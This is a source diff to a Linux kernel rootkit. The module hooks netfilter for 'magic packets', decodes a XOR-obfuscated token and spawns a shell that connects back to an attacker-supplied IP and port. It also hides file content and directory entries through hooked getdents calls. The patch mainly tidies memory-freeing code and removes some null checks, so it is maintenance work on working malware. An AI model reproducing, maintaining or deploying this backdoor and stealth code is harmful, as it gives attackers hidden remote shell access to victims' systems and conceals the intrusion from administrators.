@@ -131,11 +131,15 @@ void shell_execer(struct work_struct *work) {
     	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
 
     	exec(argv);
-    	if(task) kfree(task);
+	kfree(task->path);
+	kfree(task->ip);
+	kfree(task->port);
+	kfree(task);
 }
 
 int shell_exec_queue(char *path, char *ip, char *port) {
     	struct shell_task *task;
+	int ret = 0;
 
     	task = kmalloc(sizeof(*task), GFP_KERNEL);
     
@@ -181,11 +185,11 @@ int f_check(void *arg, int size) {
 	buf[size] = 0;
 
 	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
-		if(buf) kfree(buf);
+		kfree(buf);
 		return(1);
 	}
 out:
-	if(buf) kfree(buf);
+	kfree(buf);
 	return(-1);
 }
 
@@ -197,7 +201,7 @@ int hide_content(void *arg, int size) {
 	if(!buf) return(-1);
 
 	if(__copy_from_user((void *) buf, (void *) arg, size)) {
-		if(buf) kfree(buf);
+		kfree(buf);
 		return size;
 	}
 
@@ -210,10 +214,10 @@ int hide_content(void *arg, int size) {
 	newret = size - (p2 - p1);
 
 	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
-		if(buf) kfree(buf);
+		kfree(buf);
 		return size;
 	}
-	if(buf) kfree(buf);
+	kfree(buf);
 	return newret;
 }
 
@@ -249,7 +253,7 @@ void decode_n_spawn(const char *data) {
 	strsep(&buf, " ");
 
         if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
-	if(p) kfree(p);
+	kfree(p);
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
@@ -265,19 +269,16 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
 	struct tcphdr	_tcph;
 	struct udphdr	_udph;
 	const char *data;
-	char *_dt, *token = TOKEN;
+	char _dt, *token = TOKEN;
     	int tsize;
 
     	data = NULL;
-    	tsize = strlen(TOKEN);
+    	tsize = strlen(token);
     	s_xor(token, 11, tsize);
-
-    	if (!socket_buffer) return NF_ACCEPT;
 
     	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
 
     	if (!ip_header) return NF_ACCEPT;
-    	if (!ip_header->protocol) return NF_ACCEPT;
 
      	if (ip_header->protocol == IPPROTO_ICMP) {
         	icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_icmph), &_icmph);
@@ -480,7 +481,7 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 	if(copy_to_user(dirent, kdir, ret)) goto end;
 
 end:
-	if(kdir) kfree(kdir);
+	kfree(kdir);
 	return ret;
 }
 
@@ -524,7 +525,7 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 	if(copy_to_user(dirent, kdir, ret)) goto end;
 
 end:	
-	if(kdir) kfree(kdir);
+	kfree(kdir);
 	return ret;
 }
 
